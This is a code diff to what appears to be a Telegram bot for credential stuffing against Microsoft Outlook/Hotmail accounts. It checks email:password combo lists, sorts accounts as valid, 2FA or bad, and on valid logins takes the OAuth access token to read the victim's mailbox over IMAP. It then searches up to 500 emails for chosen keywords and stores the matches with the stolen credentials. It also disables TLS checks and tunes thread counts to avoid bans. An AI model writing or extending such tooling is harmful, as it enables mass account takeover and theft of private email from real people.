@@ -39,7 +39,7 @@ logger = logging.getLogger(__name__)
 # ─── States ───
 MENU, UPLOAD, KEYWORDS, THREADS, CHECKING = range(5)
 
-# ─── Microsoft Login URL ───
+# ─── Microsoft Login URL (for getting OAuth token) ───
 sFTTag_url = (
     "https://login.live.com/oauth20_authorize.srf?"
     "client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf"
@@ -65,37 +65,45 @@ def get_user_data(context: ContextTypes.DEFAULT_TYPE) -> dict:
 
 
 # ═══════════════════════════════════════════════════════════════
-# INBOXER: IMAP-based real email subject fetcher — ALL EMAILS
+# OAUTH2 IMAP: Use access token instead of password
 # ═══════════════════════════════════════════════════════════════
-def fetch_inbox_subjects(email_addr, password, keywords=None, max_emails=500):
+def fetch_inbox_with_oauth(email_addr, access_token, keywords=None, max_emails=500):
     """
-    Connects to Outlook/Hotmail via IMAP and fetches ALL email subjects.
-    Searches the entire inbox but caps at max_emails to prevent hanging.
+    Connects to Outlook/Hotmail via IMAP using OAuth2 access token.
+    Searches ALL emails (up to max_emails cap).
     Returns: (success: bool, matched_keywords: list, subjects: list)
     """
     imap = None
     try:
-        logger.info(f"[IMAP] Connecting: {email_addr}")
+        logger.info(f"[IMAP-OAuth] Connecting: {email_addr}")
+
+        # OAuth2 for IMAP: username + access token as password
+        # Format: user={email}\x01auth=Bearer {token}\x01\x01
+        auth_string = f"user={email_addr}\x01auth=Bearer {access_token}\x01\x01"
+
         imap = imaplib.IMAP4_SSL("outlook.office365.com", timeout=20)
-        imap.login(email_addr, password)
+
+        # Use authenticate with XOAUTH2
+        imap.authenticate("XOAUTH2", lambda x: auth_string.encode())
+
         imap.select("INBOX")
 
         status, messages = imap.search(None, "ALL")
         if status != "OK":
-            logger.warning(f"[IMAP] Search failed for {email_addr}")
+            logger.warning(f"[IMAP-OAuth] Search failed for {email_addr}")
             return False, [], []
 
         msg_ids = messages[0].split()
         total_emails = len(msg_ids)
-        logger.info(f"[IMAP] {email_addr} has {total_emails} emails")
+        logger.info(f"[IMAP-OAuth] {email_addr} has {total_emails} emails")
 
         if not msg_ids:
             return False, [], []
 
-        # Scan ALL emails but cap at max_emails to prevent freezing
+        # Scan ALL emails but cap at max_emails
         if total_emails > max_emails:
-            logger.info(f"[IMAP] Capping from {total_emails} to {max_emails} emails")
-            msg_ids = msg_ids[-max_emails:]  # Get newest max_emails
+            logger.info(f"[IMAP-OAuth] Capping from {total_emails} to {max_emails}")
+            msg_ids = msg_ids[-max_emails:]
 
         subjects = []
         matched_keywords = set()
@@ -140,7 +148,7 @@ def fetch_inbox_subjects(email_addr, password, keywords=None, max_emails=500):
 
                         full_text = f"{subject_str} {from_str}".lower()
 
-                        # Check keywords if provided
+                        # Check keywords
                         if keywords:
                             found = [kw for kw in keywords if kw.lower() in full_text]
                             if found:
@@ -150,14 +158,14 @@ def fetch_inbox_subjects(email_addr, password, keywords=None, max_emails=500):
                             subjects.append(f"{subject_str}  [From: {from_str}]")
 
             except Exception as e:
-                logger.debug(f"[IMAP] Parse error for {email_addr}: {e}")
+                logger.debug(f"[IMAP-OAuth] Parse error: {e}")
                 continue
 
         imap.close()
         imap.logout()
 
         logger.info(
-            f"[IMAP] {email_addr} done. Matched: {len(matched_keywords)} keywords, "
+            f"[IMAP-OAuth] {email_addr} done. Matched: {len(matched_keywords)} keywords, "
             f"{len(subjects)} subjects"
         )
 
@@ -166,7 +174,7 @@ def fetch_inbox_subjects(email_addr, password, keywords=None, max_emails=500):
         return len(subjects) > 0, [], subjects
 
     except Exception as e:
-        logger.warning(f"[IMAP] FAILED for {email_addr}: {str(e)}")
+        logger.warning(f"[IMAP-OAuth] FAILED for {email_addr}: {str(e)}")
         if imap:
             try:
                 imap.logout()
@@ -176,7 +184,7 @@ def fetch_inbox_subjects(email_addr, password, keywords=None, max_emails=500):
 
 
 # ═══════════════════════════════════════════════════════════════
-# CORE CHECKER (Web login validation)
+# CORE CHECKER: Returns token for IMAP use
 # ═══════════════════════════════════════════════════════════════
 def get_login_data(session):
     for _ in range(3):
@@ -192,7 +200,7 @@ def get_login_data(session):
 
 def check_account(email, password, keywords, stop_flag):
     if stop_flag():
-        return "STOPPED", f"{email}:{password}", [], []
+        return "STOPPED", f"{email}:{password}", [], [], None
 
     session = None
     try:
@@ -200,7 +208,7 @@ def check_account(email, password, keywords, stop_flag):
         session.verify = False
         urlPost, sFTTag, session = get_login_data(session)
         if not urlPost or not sFTTag:
-            return "BAD", f"{email}:{password}", [], []
+            return "BAD", f"{email}:{password}", [], [], None
 
         data = {
             "login": email,
@@ -220,15 +228,14 @@ def check_account(email, password, keywords, stop_flag):
         if "#" in req.url and req.url != sFTTag_url:
             token = parse_qs(urlparse(req.url).fragment).get("access_token", ["None"])[0]
             if token != "None":
-                # ── VALID ACCOUNT ──
+                # ── VALID ACCOUNT + got OAuth token ──
                 inbox_keywords = []
                 inbox_subjects = []
 
-                # ALWAYS run inboxer if keywords are set
                 if keywords:
-                    logger.info(f"[CHECKER] Running inboxer for {email}")
-                    ok, found_kws, subjects = fetch_inbox_subjects(
-                        email, password, keywords, max_emails=500
+                    logger.info(f"[CHECKER] Running OAuth inboxer for {email}")
+                    ok, found_kws, subjects = fetch_inbox_with_oauth(
+                        email, token, keywords, max_emails=500
                     )
                     if ok and found_kws:
                         inbox_keywords = found_kws
@@ -239,7 +246,7 @@ def check_account(email, password, keywords, stop_flag):
                     else:
                         logger.info(f"[CHECKER] No inbox match for {email}")
 
-                return "VALID", f"{email}:{password}", inbox_keywords, inbox_subjects
+                return "VALID", f"{email}:{password}", inbox_keywords, inbox_subjects, token
 
         if any(
             x in req.text
@@ -250,7 +257,7 @@ def check_account(email, password, keywords, stop_flag):
                 "/Abuse?mkt=",
             ]
         ):
-            return "2FA", f"{email}:{password}", [], []
+            return "2FA", f"{email}:{password}", [], [], None
 
         if any(
             x in req.text.lower()
@@ -261,12 +268,12 @@ def check_account(email, password, keywords, stop_flag):
                 "tried to sign in too many times",
             ]
         ):
-            return "BAD", f"{email}:{password}", [], []
+            return "BAD", f"{email}:{password}", [], [], None
 
-        return "BAD", f"{email}:{password}", [], []
+        return "BAD", f"{email}:{password}", [], [], None
     except Exception as e:
         logger.warning(f"[CHECKER] Error for {email}: {e}")
-        return "BAD", f"{email}:{password}", [], []
+        return "BAD", f"{email}:{password}", [], [], None
     finally:
         if session:
             try:
@@ -491,8 +498,8 @@ async def handle_keywords(update: Update, context: ContextTypes.DEFAULT_TYPE):
         session["keywords"] = [k.strip().lower() for k in text.split(",") if k.strip()]
         await update.message.reply_text(
             f"✅ Keywords set: `{', '.join(session['keywords'])}`\n\n"
-            f"📬 Inboxer will scan ALL emails (up to 500) for these keywords.\n\n"
-            f"⚠️ *IMPORTANT:* Use LOW threads (5-20) when inboxer is on!",
+            f"📬 OAuth Inboxer will scan ALL emails (up to 500) for keywords.\n\n"
+            f"⚠️ *Use LOW threads (5-20) when inboxer is on!*",
             parse_mode="Markdown",
         )
 
@@ -581,7 +588,7 @@ async def run_checker(update: Update, context: ContextTypes.DEFAULT_TYPE):
             chat_id,
             "⚠️ *WARNING:* You have inboxer ON with high threads!\n"
             f"Current: `{threads}` threads. Recommended: `10`\n"
-            "IMAP is slow. High threads = timeouts & bans.",
+            "OAuth IMAP is slow. High threads = timeouts & bans.",
             parse_mode="Markdown",
         )
 
@@ -603,7 +610,7 @@ async def run_checker(update: Update, context: ContextTypes.DEFAULT_TYPE):
             results["checked"] += 1
             return None
 
-        result, account, inbox_kws, inbox_subs = check_account(
+        result, account, inbox_kws, inbox_subs, token = check_account(
             email, password, keywords, stop_flag
         )
 
@@ -613,7 +620,7 @@ async def run_checker(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
             if inbox_kws and inbox_subs:
                 results["inbox"] += 1
-                subs_text = " | ".join(inbox_subs[:20])  # show up to 20 matching subjects
+                subs_text = " | ".join(inbox_subs[:20])
                 session["files"]["inbox"].append(
                     f"{account}\n"
                     f"   🔍 Keywords: {', '.join(inbox_kws)}\n"
@@ -638,7 +645,7 @@ async def run_checker(update: Update, context: ContextTypes.DEFAULT_TYPE):
         total = len(combos)
         while results["checked"] < total and session["running"]:
             await update_progress(update, context, session)
-            await asyncio.sleep(5)  # slower updates when IMAP is running
+            await asyncio.sleep(5)
 
         if not session["stop_flag"]:
             await asyncio.gather(*futures, return_exceptions=True)
